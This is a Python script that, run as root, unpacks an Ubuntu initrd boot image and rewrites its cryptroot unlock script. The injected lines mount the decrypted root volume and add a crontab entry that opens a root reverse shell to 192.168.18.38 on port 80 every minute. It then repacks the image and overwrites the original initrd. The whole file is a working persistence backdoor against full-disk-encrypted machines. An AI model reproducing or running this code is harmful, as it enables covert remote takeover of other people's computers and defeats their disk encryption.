import subprocess
import os
import sys
import glob
#import pdb;pdb.set_trace()


if os.getuid():
    sys.exit("Please run as root")

# List of terminal commands/scripts to be executed
scripts = [
    "dd if=/boot/initrd.img-4.15.0-45-generic bs=512 count=3590 of=/boot/initrd.microcode",
    "dd if=/boot/initrd.img-4.15.0-45-generic bs=1838080 skip=1 of=/boot/image",
    "mkdir /boot/copyinit",
    "mv /boot/image /boot/copyinit/",
    "zcat image | cpio -id",
    "rm /boot/copyinit/image"
]

contains = "zcat"
# Loop through the list and run each command/script
for script in scripts:
    if contains in script:
        subprocess.run(script, shell=True, check=True, cwd="/boot/copyinit/")
    else:
        subprocess.run(script, shell=True, check=True)

#Modify cryptroot
lines = ""
with open('/boot/copyinit/scripts/local-top/cryptroot', 'r') as file:
    lines = file.readlines()

# Remove the last line from the list
if lines:
    lines = lines[:-1]

new_lines = [
    "mount /dev/mapper/ubuntu--vg-root /tmp\n",
    "echo -e \"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.18.38/80 0>&1'\" >> /tmp/etc/crontab\n",
    "umount /tmp\n",
    "exit 0"]
lines.extend(new_lines)

# Open the file in write mode and write the modified lines back to the file
with open('/boot/copyinit/scripts/local-top/cryptroot', 'w') as file:
    text = ''.join(lines)
    file.write(text)

# List of terminal commands/scripts to be executed
scripts = [
    "find . | cpio -H newc -o | gzip -9 > packedImage",
    "mv /boot/copyinit/packedImage /boot/packedImage",
    "cat initrd.microcode packedImage > initrd.img-4.15.0-45-generic"
    #"sudo reboot"
]

containsFind = "find"
containsCat = "cat"
# Loop through the list and run each command/script
for script in scripts:
    if containsFind in script:
        subprocess.run(script, shell=True, check=True, cwd="/boot/copyinit/")
    elif containsCat  in script:
        subprocess.run(script, shell=True, check=True, cwd="/boot/")
    else:
        subprocess.run(script, shell=True, check=True)
